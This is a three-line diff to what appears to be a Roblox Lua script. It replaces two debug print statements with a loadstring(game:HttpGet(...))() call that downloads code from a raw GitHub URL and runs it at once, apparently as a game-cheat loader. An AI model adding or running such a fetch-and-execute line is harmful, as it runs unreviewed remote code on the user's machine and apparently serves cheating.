@@ -1,2 +1,1 @@
-print("Connecting bridge phase")
-print(_G.execifo)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/unen101byp/mvsdprem/main/mprem"))()
